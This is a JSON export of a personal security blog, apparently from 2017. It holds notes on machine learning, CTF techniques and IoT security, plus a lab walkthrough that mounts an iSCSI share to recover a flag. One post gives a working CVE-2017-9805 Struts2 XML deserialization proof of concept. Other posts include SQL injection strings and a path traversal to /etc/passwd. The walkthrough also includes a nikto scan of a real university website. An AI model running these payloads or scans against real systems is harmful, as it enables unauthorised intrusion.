{"meta":{"title":"shackle","subtitle":null,"description":null,"author":"shackle","url":"https://shackles.top"},"pages":[{"title":"archives","date":"2018-03-30T00:25:32.000Z","updated":"2018-03-30T00:37:52.434Z","comments":true,"path":"archives/index.html","permalink":"https://shackles.top/archives/index.html","excerpt":"","text":""},{"title":"categories","date":"2018-03-30T00:25:45.000Z","updated":"2018-03-30T00:38:17.419Z","comments":true,"path":"categories/index.html","permalink":"https://shackles.top/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-03-30T00:25:51.000Z","updated":"2018-03-30T00:38:36.445Z","comments":true,"path":"tags/index.html","permalink":"https://shackles.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"webbug","slug":"webbug-1","date":"2018-03-31T14:16:18.000Z","updated":"2018-03-31T14:16:18.218Z","comments":true,"path":"2018/03/31/webbug-1/","link":"","permalink":"https://shackles.top/2018/03/31/webbug-1/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"","slug":"ctf-web","date":"2018-03-29T23:18:41.441Z","updated":"2018-03-29T14:11:49.898Z","comments":true,"path":"2018/03/30/ctf-web/","link":"","permalink":"https://shackles.top/2018/03/30/ctf-web/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"机器学习重要算法","slug":"机器学习重要算法","date":"2017-10-01T15:53:56.000Z","updated":"2018-03-30T03:18:24.401Z","comments":true,"path":"2017/10/01/机器学习重要算法/","link":"","permalink":"https://shackles.top/2017/10/01/机器学习重要算法/","excerpt":"","text":"机器学习重要算法监督学习和非监督学习。 监督学习： 分类和回归； 监督学习： 聚类算法，密度估计算法。 分类 :需已知样本特征 Classification (分类)，一个 classifier 会从它得到的训练集中进行“学习”，从而具备对未知数据进行分类的能力，这种提供训练数据的过程通常叫做 supervised learning (监督学习)（样本有标签）， 所谓分类，简单来说，就是根据文本的特征或属性，划分到已有的类别中。如在自然语言处理NLP中，我们经常提到的文本分类便就是一个分类问题，一般的模式分类方法都可用于文本分类研究。 常用的分类算法包括： k-最近邻法(k-nearest neighbor，kNN)， 决策树分类法， 朴素的贝叶斯分类算法(native Bayesian classifier)(NBC)、 基于支持向量机(SVM)的分类器， 神经网络法(SNN)， 模糊分类法等等 分类作为一种监督学习方法，要求必须事先明确知道各个类别的信息，并且断言所有待分类项都有一个类别与之对应。但是很多时候上述条件得不到满足，尤其是在处理海量数据的时候，如果通过预处理使得数据满足分类算法的要求，则代价非常大，这时候可以考虑使用聚类算法。 聚类：把相似的对象聚合 Clustering(聚类)，简单地说就是把相似的东西分到一组，聚类的时候，我们并不关心某一类是什么，我们需要实现的目标只是把相似的东西聚到一起，因此，一个聚类算法通常只需要知道如何计算相似 度就可以开始工作了，因此 clustering 通常并不需要使用训练数据进行学习，这在 Machine Learning 中被称作 unsupervised learning (无监督学习). 聚类分析指将物理或抽象对象的集合分组为由类似的对象组成的多个类的分析过程。 常用的分类算法包括： 而K均值(K-meansclustering)聚类则是最典型的聚类算法 除此之外，还有很多诸如 属于划分法K-MEDOIDS算法、CLARANS算法；属于层次法的BIRCH算法、CURE算法、CHAMELEON算法等；基于密度的方法：DBSCAN算法、OPTICS算法、DENCLUE算法等；基于网格的方法：STING算法、CLIQUE算法、WAVE-CLUSTER算法；基于模型的方法，本系列后续会介绍其中几种。 参考大神博客：http://blog.csdn.net/v_july_v/article/details/7577684 分类算法kNN K-邻近算法采用测量不同特征值之间的距离方法。进行分类。目标样本与存在标签的样本集作对比。 取前K个最为相似的数据，选择K最多的目标的新分类。 给定训练数据样本和标签，对于某测试的一个样本数据，选择距离其最近的k个训练样本，这k个训练样本中所属类别最多的类即为该测试样本的预测标签。简称kNN。 通常k是不大于20的整数，这里的距离一般是欧式距离。 一般流程 收集数据（距离计算所需要的数值，最好是结构化的数据格式） 分析数据：可以使用任何方法 训练算法：此步骤不适合K-邻近算法 测试算法：计算错误率 使用算法：输入样本数据+结构化输出结果 —》然后运行k-近邻算法判定输入数据属于哪个分类-=-》最后应用对计算出的分类执行后续操作。 决策树决策树学习采用的是自顶向下的递归方法，其基本思想是以信息熵为度量构造一棵熵值下降最快的树，到叶子节点处的熵值为零，此时每个叶节点中的实例都属于同一类。以树的形式划分数据集(ID3算法)。 一般流程 收集数据(树构造算法只适用于标称型数据、数据必须离散化) 分析数据：检查图形是否符合规范 训练算法:构造树的数据结构(ID3算法等等) 测试算法：使用经验树计算错误率 使用算法:此步骤可以适用于任何监督学习算法，而使用决策树可以更好的理解数据的内在含义。 朴素贝叶斯在给定目标值时属性之间相互条件独立的前提下，贝叶斯决策理论的核心思想：即选择具有最高概率的决策。 （基于条件概率） 一般流程 收集数据（需要数值型或者布尔型） 分析数据 训练算法：计算不同的独立特征的条件概率 测试算法：计算错误率 使用算法：文档分类居多 回归（预测）Logistic 回归最优化算法。 logistic函数根据现有的数据对于分类边界线建立回归公式。参考：https://www.zhihu.com/question/36714044?sort=created 一般流程 收集数据（需要进行距离计算，数值型，结构化数据最佳） 训练数据：大部分时间进行训练，训练的目的是为了找到最佳的分类回归系数。 测试数据 使用数据：输入数据–》结构化处理–》分类判定–》基于已经训练好的回归系数就可以对于这些数值进行简单的回归计算，判定它们属于哪个分类–》进一步处理 ​ support vector machine (SVM)支持向量机，因其英文名为support vector machine，故一般简称SVM，通俗来讲，它是一种二类分类模型，其基本模型定义为特征空间上的间隔最大的线性分类器，其学习策略便是间隔最大化，最终可转化为一个凸二次规划问题的求解。 参考：http://blog.csdn.net/v_july_v/article/details/7624837 https://www.zhihu.com/question/21094489https://zhuanlan.zhihu.com/p/21932911?refer=baina SVM通过核函数视图非线性的问题的数据集转变为核空间中一个线性可分的数据集。 神经网络是通过多个感知器(Perceptron)的组合叠加来解决非线性的分类问题。 神经网络CNN(卷积神经网络)CNN：https://www.zhihu.com/question/52668301 一般流程聚类算法# 隐马可夫模型(HMM)马可夫模型参考：https://www.zhihu.com/question/20962240 马尔可夫模型可以看做是一个转移弧上有概率的非确定的有限状态自动机。image 在上图中，圆圈表示状态，状态之间的转移用带箭头的弧表示，弧上的数字为状态转移的概率，初始状态用标记为start的输入箭头表示，假设任何状态都可作为终止状态。图中零概率的转移弧省略，且每个节点上所有发出弧的概率之和等于1。 隐马可夫模型(HMM)每个状态代表了一个可观察的事件，所以，马可夫模型有时又称作视马可夫模型(VMM)，这在某种程度上限制了模型的适应性。而在我们的隐马可夫模型(HMM)中，我们不知道模型所经过的状态序列，只知道状态的概率函数，也就是说，观察到的事件是状态的随机函数，因此改模型是一个双重的随机过程。其中，模型的状态转换是不可观察的，即隐蔽的，可观察事件的随机过程是隐蔽的状态过程的随机函数。 k-均值算法过程：Kmeans中文称为k-均值，步骤为： (1)它事先选定k个聚类中心，(2)然后看每个样本点距离那个聚类中心最近，则该样本就属于该聚类中心。(3)求每个聚类中心的样本的均值来替换该聚类中心(更新聚类中心)。(4)不断迭代(2)和(3), 直到收敛。","categories":[],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://shackles.top/tags/机器学习/"}]},{"title":"靶机渗透一","slug":"沙盒靶机渗透一","date":"2017-09-19T15:53:56.000Z","updated":"2018-03-30T00:40:27.501Z","comments":true,"path":"2017/09/19/沙盒靶机渗透一/","link":"","permalink":"https://shackles.top/2017/09/19/沙盒靶机渗透一/","excerpt":"","text":"1ip：192.168.1.106 //靶机ip nmap -sS -A 192.168.1.10612345678910111213141516171819root@shackle:~# nmap -sS -A 192.168.1.106Nmap scan report for 192.168.1.106Host is up (0.31s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 89:c2:ae:12:d6:c5:19:4e:68:4a:28:e9:06:bd:9c:19 (RSA)|_ 256 f0:0c:ae:37:10:d3:6d:a2:85:3a:77:04:06:94:f8:0a (ECDSA)80/tcp open http nginx|_http-server-header: nginx|_http-title: Welcome!514/tcp filtered shell3260/tcp open iscsi?|_iscsi-info: ERROR: Script execution failed (use -d to debug)Aggressive OS guesses: Actiontec MI424WR-GEN3I WAP (99%), DD-WRT v24-sp2 (Linux 2.4.37) (98%), Linux 3.2 (98%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (96%), Linux 4.4 (96%), Microsoft Windows XP SP3 (96%), BlueArc Titan 2100 NAS device (91%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 22 80 port,326 port 是iscsi的端口。参考：http://www.freebuf.com/articles/102500.htmlhttp://www.freebuf.com/articles/102500.htmlhttps://www.pentestpartners.com/security-blog/an-interesting-route-to-domain-admin-iscsi/ iSCSI：Internet 小型计算机系统接口 （iSCSI：Internet Small Computer System Interface）。 1234iSCSI主要是透过TCP/IP的技术，将储存设备端透过iSCSI target (iSCSI目标端)功能，做成可以提供磁盘的服务器端，再透过iSCSI initiator (iSCSI初始化用户)功能，做成能够挂载使用iSCSI target的用户端，如此便能透过iSCSI设置来进行磁盘的应用了。也就是说，iSCSI 这个架构主要将储存装置与使用的主机分为两个部分，分别是： iSCSI target：就是储存设备端，存放磁盘或RAID的设备，目前也能够将Linux主机模拟成iSCSI target了！ 目的在提供其他主机使用的『磁盘』；iSCSI initiator：就是能够使用target的用户端，通常是服务器。 也就是说，想要连接到iSCSI target的服务器，也必须要安装iSCSI initiator的相关功能后才能够使用iSCSI target提供的磁盘。 dirb http://192.168.1.106 #扫目录1http://192.168.1.106/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/checking/mode/trap/affiliates/dba/program/font/index.html #### 123456789&gt;&gt;&gt; import base6&gt;&gt;&gt; a = &apos;SGVsbG8sIGlzIGl0IGZsYWdzIHlvdSdyZSBsb29raW5nIGZvcj8KSSBjYW4gc2VlIGl0IGluIHlvdXIgZXllcwpJIGNhbiBzZWUgaXQgaW4geW91ciBzbWlsZQpGbGFncyBhcmUgYWxsIEkndmUgZXZlciB3YW50ZWQgYW5kIG15IHBvcnRzIGFyZSBvcGVuIHdpZGUgCkNhdXNlIHlvdSBrbm93IGp1c3Qgd2hhdCB0byBzYXkgYW5kIHlvdSBrbm93IGp1c3Qgd2hhdCB0byBkbwpBbmQgSSB3YW50IHRvIHRlbGwgeW91IHNvIG11Y2gsIG5vIGZsYWdzIGZvciB5b3UuLi4K&apos;&gt;&gt;&gt; print base64.b64decode(a)Hello, is it flags you&apos;re looking for?I can see it in your eyesI can see it in your smileFlags are all I&apos;ve ever wanted and my ports are open wide Cause you know just what to say and you know just what to doAnd I want to tell you so much, no flags for you... 12345678910111213141516root@shackle:~# nikto -h 192.168.1.106- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.1.106+ Target Hostname: 192.168.1.106+ Target Port: 80+ Start Time: 2017-09-19 22:27:41 (GMT8)---------------------------------------------------------------------------+ Server: nginx+ Server leaks inodes via ETags, header found with file /, fields: 0x58b7fa74 0x511 + The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use &apos;-C all&apos; to force check all possible dirs)+ 7535 requests: 0 error(s) and 4 item(s) reported on remote host+ End Time: 2017-09-19 22:27:59 (GMT8) (18 seconds) 12345678root@shackle:~# iscsiadm -m discovery -t st -p 192.168.1.106:3260 #连接192.168.1.106:3260,1 iqn.2017-02.local.skuzzy:storage.sys0root@shackle:~# iscsiadm --m node -p 192.168.1.106 --login --target #登录iqn.2017-02.local.skuzzy:storage.sys0Logging in to [iface: default, target: iqn.2017-02.local.skuzzy:storage.sys0, portal: 192.168.1.106,3260] (multiple)Login to [iface: default, target: iqn.2017-02.local.skuzzy:storage.sys0, portal: 192.168.1.106,3260] successful. 12345678910111213141516171819202122232425root@shackle:~# fdisk -lDisk /dev/sda: 60 GiB, 64424509440 bytes, 125829120 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisklabel type: dosDisk identifier: 0x5acbe586Device Boot Start End Sectors Size Id Type/dev/sda1 * 2048 124780543 124778496 59.5G 83 Linux/dev/sda2 124782590 125827071 1044482 510M 5 Extended/dev/sda5 124782592 125827071 1044480 510M 82 Linux swap / SolarisDisk /dev/sdb: 1 GiB, 1073741824 bytes, 2097152 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesroot@shackle:~# mount /dev/sdb /mnt/ # 挂载root@shackle:~# cd /mnt/root@shackle:/mnt# cat flag1.txtCongratulations! You&apos;ve discovered the first flag!flag1&#123;c0abc15976b98a478150c900ebb0c86f0327f4dd&#125;Let&apos;s see how you go with the next one... - Nikto v2.1.6 Target IP: 210.44.112.115 Target Hostname: cs.lcu.edu.cn Target Port: 80 Start Time: 2017-09-19 23:44:55 (GMT8) Server: Apache Retrieved x-powered-by header: PHP/5.4.29 The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS Uncommon header ‘link’ found, with contents: http://cs.lcu.edu.cn/; rel=shortlink The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type Entry ‘/wp-admin/‘ in robots.txt returned a non-forbidden or redirect HTTP code (302) “robots.txt” contains 2 entries which should be manually viewed. Uncommon header ‘tcn’ found, with contents: list Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for ‘index’ were found: index.php Web Server returns a valid response with junk HTTP methods, this may cause false positives. Server leaks inodes via ETags, header found with file /sitemap.xml, fields: 0x0 0x4fc7e6798f940 OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. OSVDB-3092: /news: This might be interesting… /test/test.php: Output from the phpinfo() function was found. OSVDB-3233: /test/test.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. OSVDB-3092: /LICENSE.txt: License file found may identify site software. OSVDB-3092: /xmlrpc.php: xmlrpc.php was found. OSVDB-3092: /ci/: This might be interesting… potential country code (CÔte D’ivoire) /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin ‘Tested up to’ version usually matches the WordPress version /readme.html: This WordPress file reveals the installed version. /wp-links-opml.php: This WordPress script reveals the installed version. OSVDB-3092: /license.txt: License file found may identify site software. OSVDB-3092: /LICENSE.TXT: License file found may identify site software. Cookie wordpress_test_cookie created without the httponly flag /wp-login/: Admin login page/section found. /wordpress/: A Wordpress installation was found. 8369 requests: 0 error(s) and 28 item(s) reported on remote host End Time: 2017-09-20 00:59:39 (GMT8) (4484 seconds)","categories":[{"name":"blog","slug":"blog","permalink":"https://shackles.top/categories/blog/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://shackles.top/tags/渗透/"}]},{"title":"车联网安全","slug":"车联网安全基础","date":"2017-09-09T15:53:56.000Z","updated":"2018-03-30T03:21:11.556Z","comments":true,"path":"2017/09/09/车联网安全基础/","link":"","permalink":"https://shackles.top/2017/09/09/车联网安全基础/","excerpt":"","text":"车联网安全基础 2017-08-02 车联网汽车现状：智能化 ，网联化，电动化 车载系统 ​ 安全现状 ： 车联网安全解决方案 终端 设计 ids 网络 车内部可信机制 车与智能手机 车网络服务 云服务 标准规范 车载网络 CSMA/CD 带冲突检测控制 CAN总线 主要测传输机制csma/cd CAN是控制器局域网络(Controller Area Network, CAN)的简称 一种通讯协议（类似TCP IP协议） ​ 车载网络 C类网络 ​ 录制重放 隔离重放 实时 man-in-the-middle ​ ### 手机卡 HMI 与车内 网络软件操作系统的安全性、通讯安全、对于安全持续度量。 防御自动驾驶安全性问题 方程式 Al 内部攻击 传感信号伪造 ​ 自动驾驶以及车联网的整体安全架构 系统安全的设计 车通讯 车就是个内网重放 篡改 网络与系统防御与攻击 app加固 车联网安全 T-BOX（网络） CAN总线（控制汽车）","categories":[],"tags":[{"name":"物联网安全","slug":"物联网安全","permalink":"https://shackles.top/tags/物联网安全/"}]},{"title":"Struts2 远程代码执行漏洞S2-052","slug":"Struts2 远程代码执行漏洞S2-052","date":"2017-09-06T15:53:56.000Z","updated":"2018-03-29T23:22:30.424Z","comments":true,"path":"2017/09/06/Struts2 远程代码执行漏洞S2-052/","link":"","permalink":"https://shackles.top/2017/09/06/Struts2 远程代码执行漏洞S2-052/","excerpt":"","text":"Struts2 远程代码执行漏洞S2-052 2017-09-06 Struts2 远程代码执行漏洞 : S2-052Struts2 应用又曝出存在新的高危远程代码执行漏洞。该漏洞由lgtm.com的安全研究员汇报，编号为 CVE-2017-9805 ，漏洞危害程度为高危（Critical）。当用户使用带有 XStream 程序的 Struts REST 插件来处理 XML payloads 时，可能会遭到远程代码执行攻击。 前提：启用Strut REST 插件。 Struts 2.5 – Struts 2.5.12 版本 官方公告：https://cwiki.apache.org/confluence/display/WW/S2-052 漏洞编号：S2-052 CVE-2017-9805 S2-052概述Struts2 REST 插件使用带有 XStream 程序的 XStream Handler 进行未经任何代码过滤的反序列化操作，这可能在反序列化XML payloads时导致远程代码执行。任意攻击者都可以构造恶意的XML内容提升权限。 漏洞是由 Semmle 使用其开源分析工具 lgtm 及 QL 语言编写的 Java 反序列威胁查询检测而出的，详情可参考https://lgtm.com/blog/apache_struts_CVE-2017-9805 12345org.apache.struts2.rest.handler.AllowedClassesorg.apache.struts2.rest.handler.AllowedClassNamesorg.apache.struts2.rest.handler.XStreamPermissionProvider 漏洞POC123456789101112131415161718GET /struts2-rest-showcase/orders.xhtml HTTP/1.1Host: localhost:8080User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/xmlReferer: http://127.0.0.1:8080/struts2-rest-showcase/orders/3/editCookie: JSESSIONID=6FBA41434A908795E708AE545267C797; UM_distinctid=15e36471d10d0-09d67d334fbd0f8-49594234-100200-15e36471d11231; CNZZDATA1670348=cnzz_eid%3D1690420666-1504145890-%26ntime%3D1504329636Connection: closeIf-None-Match: 182927695Content-Length: 1647&lt;map&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt; &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;C:\\Windows\\System32\\calc.exe&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;/map&gt; 效果如下：","categories":[],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://shackles.top/tags/漏洞/"}]},{"title":"CTF-逆向 基础","slug":"CTF-逆向 基础","date":"2017-08-29T15:53:56.000Z","updated":"2018-03-29T23:24:36.263Z","comments":true,"path":"2017/08/29/CTF-逆向 基础/","link":"","permalink":"https://shackles.top/2017/08/29/CTF-逆向 基础/","excerpt":"","text":"CTF-逆向 基础 2017-08-07 https://www.gitbook.com/book/wizardforcel/re-for-beginners/details 逆向 ida 调试 安卓 native层 设置断点 设置程序 安卓附加上去，IDA F5调试 去除软件保护 侦壳 PEID Exelnfo （查看是什么壳） 脱壳 脱壳机 esp 定快速脱壳 去除花指令 OLLyDBG脚本 去除混淆 net 反混淆de4dot 定位验证代码 验证代码（算法） 正面驱动直入 从输入输出寻找 利用字符串找 CTF逆向常见算法 简单算法 简单异或 带雪崩的异或 加密算法（AES , RSA) 散列算法（MD5，SHA1) 解方程 有趣的算法 走迷宫 ..各种脑洞 经验加成 边信道攻击 Google 大法好 逆向trick xspy 应对MFC程序 手动加载signature 调试小技巧 CTF VS 现实 IDA高级使用 ​","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://shackles.top/tags/CTF/"}]},{"title":"CTF-Misc","slug":"ctf-misc","date":"2017-08-19T15:53:56.000Z","updated":"2018-03-29T23:24:11.692Z","comments":true,"path":"2017/08/19/ctf-misc/","link":"","permalink":"https://shackles.top/2017/08/19/ctf-misc/","excerpt":"","text":"CTF-Misc 2017-08-06 misc先上一些常用命令strings // 查找字符 foremost // 自动分离 binwalk // binwalk -e 自动提取 diff // 对比文件 pacpfix // pcap文件修复工具 DShell tshark // 命令行提取数据包 或者tcpdump Recon(信息收集)很少出现 Encode编码 各种进制 ​ 二进制转化为 123ASCII二维码图片 base家族 base64 32 16 曼彻斯特编码/差分曼彻斯特编码 二进制编码工具：JpocketKnife1.得到的二进制有可能7位一组，正常八位一组2.二维码：二进制串的长度是一个平方数3.因式分解其长度 base64编码方式： 字符对应ASCII转换成八位二进制 base64的基础单位是 38bit的二进制，若是不够38bit则在后面添加0字节（padding）直至满足 38bit的二进制转换成46bit的二进制 4*6bit的二进制转换成十进制 对照base64表把十进制转换成字符 解码方式: 检查base64编码后面有几个等于号 把字符串按照base64表转换成4*6的倍数位数二进制 删除等于号的个数*8的bit 按照6个bit一组转成字符 可以发现，编码和解码的方式并非完全对称的，解码的时候直接根据等号的数量删除bit,如果我们把数据写到填充的0的前两位，那么就可以实现隐写的功能。 判断方法: 先解码在编码，和原字符串对比，若不一样就是有隐写 www.atool.org(编码工具集) www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html(介绍CTF编码的文章) 图形码条形码,二维码。 Quoted printable用等号隔开 Brainfuckhttps://www.splitbrain.org/services/ook JSfuckhttp://www.jsfuck.com/可以直接扔到浏览器里运行 ####代码混淆明显，在线解码 工具小结http://tool.ph0en1x.com/hashtool/tools.html#convJPKCTFCrack Forensic &amp; Stego 取证对象：各种数据包PCAP,图像，音频，压缩包，磁盘，内存镜像，PDF,word 目的：发现文件隐藏的字符串，通常有文件的修复,字符串常常又与隐写加密结合在一起 &lt;&lt;黑客大追踪&gt;&gt; 熟悉常用文件的文件头。 Tools file strings diff binwalk,foremost binwalk -e拓展提高：http://www.freebuf.com/sectool/15266.html 010ditor分析文件16进制,强大的模板功能 图片：JPG特征：以 FF D8 开头，以 FF D9 结尾。格式：标记码+压缩数据标记码： 由两个字节构成，第一个字节是固定值0xFF，后一个字节则根据不同意义有不同数值压缩数据：前两个字节保存整个段的长度，包括这两个字节隐写方式：利用文件格式隐藏信息，插入法 文件尾部插入储存在APP1数据区中工具：MagicEXIF 每段开始前COM注释：FF 开始标记FE COM注释标记符00 02 总长度 11 内容工具:stegdetect 检测隐写工具 PNG特征：以89 50 4E 47 开头。格式:PNG文件署名域+标准数据块(+辅助数据块)隐写方式: IDAT 隐藏数据:PNG图片中可以存在多个IDAT块 因此这也成了一个隐写的途径 修改PNG图片的高度,隐藏数据 双图 ​ 工具:pngcheck ​ #####pngcheck LSB隐写stegsolve:必备 ​ 位平面对图像的影响不一样，可以隐写到不是很重要的位平面。 BMP 文件格式特征是以 50 4B 03 04 开头，有时也会出现 50 4B 05 06 和 50 4B 07 08 的情况。 GIF特征：以 GIF89a 或 GIF87a 开头。 文件格式 空间 时间轴 identity命令 //、linux上的identify命令主要用于获取一个或多个图像文件的格式和特性。 思路： 压缩文件：zip文件格式 压缩源文件数据区• 文件头 ： PK开头• 文件数据• （数据描述符） 思路： 文件格式 CRC32爆破：有时候加密的文件很小，直接枚举数据的CRC32值，如果相同，就相当于知道了文件的内容 伪加密 已知明文攻击 目录结束标识 RAR 文件特征：以以 Rar! 开头。 流量分析(重要) 文件修复 协议分析• 总体把握（整体分析） 协议分级 端点统计 • 过滤赛选 过滤语法 Host，Protocol，contains，特征值 • 发现异常 特殊字符串 协议某字段 • 数据提取 字符串取 文件提取 数据提取 Wireshark Pcapfix //修复数据包 Dshell(强大) tshark（wireshark命令行版本）命令:1. tr，2.xxd 其他音频文件 频谱有可能是在高频上，需要进行拉伸。(Rctf 2017) 波形 隐写软件：MP3Stego,Slienteye 视频类AVI，MP4较为常见 工具： Ffmpeg：BCTF2016-catvideo Ourstrect HTML隐写Snow.exe：通过插入制表位与空格使得嵌入的数据在浏览器中不可见http://fog.misty.com/perry/ccs/snow/snow/ PYC文件类字节码修复,隐写，逆向分析。 Tools pycdc uncompyle http://unpyc.sourceforge.net/Opcodes.html\\ Stegosaurus 隐写 12python3.6 stegosaurus.py 5061c764-2ac4-4386-afd0-2f7a69139efa.pyc -xExtracted payload: Flag&#123;HiD3_Pal0ad_1n_Python&#125; 1http://www.freebuf.com/sectool/129357.html 固件分析类（国内少）Pro类 Python模拟输入 爆破 算法 安卓逆向分析调试: IDA Pro GDB -angrHook: Xposed Frida（important） java层： java-&gt;jvm字节码-&gt;dalvik字节码(javac,dx) dex-&gt;smali(baksmaili) dex-&gt;smali,伪java(jeb) dex-&gt;java字节码(dex2jar) java字节码-&gt;伪java(jd-gui) native层:IDA 代码混淆C/C++源码混淆工具 LLVM-Obfuscator CXX-Obfuscator 混淆技术 指令替换 伪造控制流 扁平化控制流 隐藏与取证Rootkit取证技术","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://shackles.top/tags/CTF/"}]},{"title":"家用路由器安全","slug":"路由器安全","date":"2017-07-29T15:53:56.000Z","updated":"2018-03-29T23:25:31.727Z","comments":true,"path":"2017/07/29/路由器安全/","link":"","permalink":"https://shackles.top/2017/07/29/路由器安全/","excerpt":"","text":"家用路由器安全 2017-08-09 路由器安全CGI 程运行 请求处理：客户端http请求 http server CGI CGI程序返回结果 攻击CGI 程序 在同一个请求中无法进行多次交互； binwak 漏洞利用 busybox 提权 自己编译shellcode sleep(1) ​ 路由器web漏洞 xss csrf 认证漏洞 命令注入 lua","categories":[],"tags":[{"name":"物联网安全","slug":"物联网安全","permalink":"https://shackles.top/tags/物联网安全/"}]},{"title":"Web 服务端安全","slug":"Web 服务端安全","date":"2017-06-29T15:53:56.000Z","updated":"2018-03-29T23:23:35.251Z","comments":true,"path":"2017/06/29/Web 服务端安全/","link":"","permalink":"https://shackles.top/2017/06/29/Web 服务端安全/","excerpt":"","text":"Web 服务端安全 2016-10-05 Web 服务端webweb服务端 逆向的过程； SQL 注入1.$user=admin’or 1=1# Union 注入 有回显 猜解出来字段 可以填充查询结果 数据库报错； Boolean 盲注（在木有数据回显） Timing 盲注2 if（1，name，price） if(select(flag)，name，price） 文件包含 读取敏感文件 包含一句话getshell 创建临时文件 ​ http://58.154.33.13:8004/show.php?id=1502009577&amp;type=zip 123‘’,../../../../../../../etc/password# https://zhuanlan.zhihu.com/p/26308699","categories":[],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://shackles.top/tags/Web安全/"}]},{"title":"Violent Python","slug":"Violent Python","date":"2017-04-07T15:53:56.000Z","updated":"2018-03-29T23:23:10.224Z","comments":true,"path":"2017/04/07/Violent Python/","link":"","permalink":"https://shackles.top/2017/04/07/Violent Python/","excerpt":"","text":"Violent Python 